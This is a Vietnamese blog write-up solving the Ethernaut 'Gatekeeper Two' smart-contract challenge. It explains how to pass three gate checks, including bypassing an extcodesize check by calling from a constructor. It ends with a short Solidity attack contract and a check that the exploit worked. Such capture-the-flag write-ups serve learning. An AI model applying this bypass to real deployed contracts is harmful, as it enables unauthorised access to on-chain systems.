---
layout: post
title: "The Ethernaut: 14 - Gatekeeper Two"
mathjax: true
---
# 14. Gatekeeper Two 　★★★★★★

**Nhiệm vụ**: vượt qua 3 cánh cổng khác và thay đổi địa chỉ của cửa vào

```js
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Phân tích & Solution

Ta sẽ phân tích cách vượt qua từng cửa một giống như bài [GatekeeperOne](http://dotrungkien.github.io/2018/06/21/the-ethernaut-13/)

### Cửa số 1

```js
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

`tx.origin` sẽ là địa chỉ nguồn nơi phát đi giao dịch, là một ai đó, `msg.sender` là địa chỉ gọi tới hàm hiện tại

Có nghĩa là, khi ta gọi trực tiếp một hàm contract thông thường thì `msg.sender` và `tx.origin` là giống nhau, còn nếu ta gọi hàm đó thông qua một contract trung gian thì `tx.origin` vẫn sẽ là ta, nhưng `msg.sender` sẽ là contract trung gian.

Vì thế ta chỉ cần dùng một contract trung gian là có thể vượt qua cửa số 1.

### Cửa số 2

```js
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller) }
  require(x == 0);
  _;
}
```

`extcodesize(caller)` chính là lấy ra lượng code chứa trong `caller` gọi đến contract `GatekeeperTwo` này. `caller` có thể là người (account thông thường), cũng có thể là contract.

một điều kiện quan trọng ở đây chính là `require(x == 0)`, có nghĩa là `caller` không có tí code nào ? hay caller chỉ có thể là người. Điều này chẳng phải đã phủ nhận điều kiện ở gate 1 rồi hay sao ? làm thế nào để ta có thể qua được 2 cửa cùng một lúc được ?

Đó chính là lúc ta cần đến `yellow paper` - tài liệu đặc tả kỹ thuật của ethereum, trong đó có đoạn:

> During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while
CODESIZE should return the length of the initialization cod

có nghĩa là trong contract thì trong constructor codesize vẫn là 0, chỉ sau khi hoàn thành constructor thì codesize mới có giá trị.

Điều này gợi ý ta vượt qua gate 2 bằng cách gọi hàm enter ngay trong constructor của contract tấn công, nó vừa đảm bảo ta dùng contract trung gian, lại vừa đảm bảo `codesize == 0`. Yeah!

### Cửa số 3

```js
modifier gateThree(bytes8 _gateKey) {
  require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
  _;
}
```

điều kiện này rất là dễ, chỉ đơn thuần là một phép *XOR* mà thôi. Ta biết rằng nếu `a XOR b = c` thì `b = a XOR c`, một tính chất rất cơ bản của *XOR*. Do đó:

```js
uint64(_gateKey) = uint64(keccak256(msg.sender)) ^ (uint64(0) - 1)
```

có một điều lưu ý ở đây, do chúng ta sử dụng contract trung gian để tấn công, vì thế địa chỉ `msg.sender` ở đây chính là địa chỉ của contract trung gian, nên trong code của contract trung gian, ta phải thay thế `msg.sender` bằng `address(this)`

Cuối cùng code của contract tấn công sẽ như sau:

```js
contract Backdoor {
  function Backdoor (address _target) public {
    GatekeeperTwo(_target).enter(bytes8((uint64(uint64(keccak256(address(this)))^(uint64(0) - 1)))));
  }
}
```

đơn giản phải không. Paste lên Remix, compile với địa chỉ `_target` là địa chỉ instance của bạn.

![png]({{ site.url }}/assets/images/GatekeeperTwo.png)

Kiểm tra lại xem entrant đã đổi thành địa chỉ của mình chưa ?

```js
await contract.entrant()
"0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b"
```

Submit && All done!

## Bình luận

Đây là một bài tập theo kiểu dạng "biết thì rất dễ, không biết thì không biết đằng nào mà lần". Phần `assembly { x := extcodesize(caller) }` thực sự là một trick rất khó nhằn.

Enjoy coding!